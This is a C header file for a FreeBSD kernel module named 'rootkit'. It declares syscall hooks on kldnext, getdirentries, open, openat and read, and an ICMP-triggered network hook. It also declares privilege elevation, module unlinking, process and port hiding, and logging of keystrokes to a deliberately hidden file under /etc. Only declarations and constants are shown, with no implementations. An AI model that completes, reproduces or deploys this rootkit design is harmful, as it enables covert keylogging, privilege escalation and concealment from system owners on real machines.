
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/syscallsubr.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/dirent.h>
#include <sys/cdefs.h>
#include <sys/resourcevar.h>
#include <sys/fcntl.h>
#include <sys/errno.h>

#include <sys/filedesc.h>


#include <sys/systm.h>
#include <sys/pcpu.h>
#include <sys/fcntl.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <sys/socket.h>


#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

// Network includes
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>

#define LINKER_FILE "rootkit.ko"
#define MODULE_NAME "rootkit"
#define LOGFILE "/etc/good_luck_finding_this/syscall_number.txt"
#define KEYSTROKE "/etc/good_luck_finding_this/keystrokes.txt"

// #define NETWORK_TRIGGER "1337"

#define R_FLAG_READ		0b00000001
#define R_FLAG_WRITE	0b00000010
#define R_FLAG_EXEC		0b00000100
#define R_FLAG_VIEW		0b00001000

#define INSERT_NETWORK_HOOKS 12
#define REMOVE_NETWORK_HOOKS 13

typedef TAILQ_HEAD(, module) modulelist_t;

extern struct sx kld_sx;
extern int next_file_id;
extern int nextid;
extern linker_file_list_t linker_files;
extern modulelist_t modules;

extern struct protosw inetsw[];

struct module {
	TAILQ_ENTRY(module) link;    /* chain together all modules */
	TAILQ_ENTRY(module) flink;   /* all modules in a file */
	struct linker_file *file;   /* file which contains this module */
	int refs;    /* reference count */
	int id;      /* unique id number */
	char *name;   /* module name */
	modeventhand_t handler; /* event handler */
	void *arg;    /* argument for handler */
	modspecific_t data;    /* module specific data */
};

struct node {
	char filename[256];
	struct node * next;
	uint8_t flags;
};

// Hooks
int insert_hooks(void);
int remove_hooks(void);
int hook_sys_kldnext(struct thread *td, struct kldnext_args *uap);
int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap);
int hook_sys_open(struct thread *, struct open_args *);
int hook_sys_openat(struct thread * td, struct openat_args * uap);
int hook_sys_read(struct thread *td, struct read_args * uap);

// Network hooks
int insert_network_hooks(void);
int remove_network_hooks(void);
int hook_icmp_input(struct mbuf **mp, int *offp, int proto);

// Additional functions
void elevate(struct thread *td);

// Kernel Object Manipulation
int mod_unlink(struct module *module, int cmd, void *arg);
int process_hiding(char * p_name);
int port_hiding(u_int16_t lport);

// File system permission manipulation
int add_file(char * uaddr);
int remove_file(char * uaddr);
int check_file(char * uaddr);
int set_flag_bits(char * uaddr, uint8_t flags);
int unset_flag_bits(char * uaddr, uint8_t flags);
uint8_t get_flags(char * uaddr);

// File writer
int filewriter_closelog(struct thread *td, int fd);
int filewriter_openlog(struct thread *td, int *fd, char *path);
int filewriter_writelog(struct thread *td, int fd, char *line, u_int len);

